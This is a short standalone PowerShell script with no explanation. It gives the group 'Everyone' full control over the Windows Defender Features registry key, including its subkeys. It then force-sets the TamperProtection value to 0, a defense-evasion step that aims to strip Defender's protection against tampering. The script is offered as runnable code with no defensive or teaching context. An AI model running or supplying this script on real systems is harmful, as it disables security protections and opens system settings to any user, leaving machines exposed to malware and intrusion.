$acl = Get-Acl "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
$person = [System.Security.Principal.NTAccount]"Everyone"          
$access = [System.Security.AccessControl.RegistryRights]"FullControl"
$inheritance = [System.Security.AccessControl.InheritanceFlags]"ContainerInherit,ObjectInherit"
$propagation = [System.Security.AccessControl.PropagationFlags]"None"
$type = [System.Security.AccessControl.AccessControlType]"Allow"
$rule = New-Object System.Security.AccessControl.RegistryAccessRule($person,$access,$inheritance,$propagation,$type)
$acl.AddAccessRule($rule)
$acl | Set-Acl
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value "0" -Force
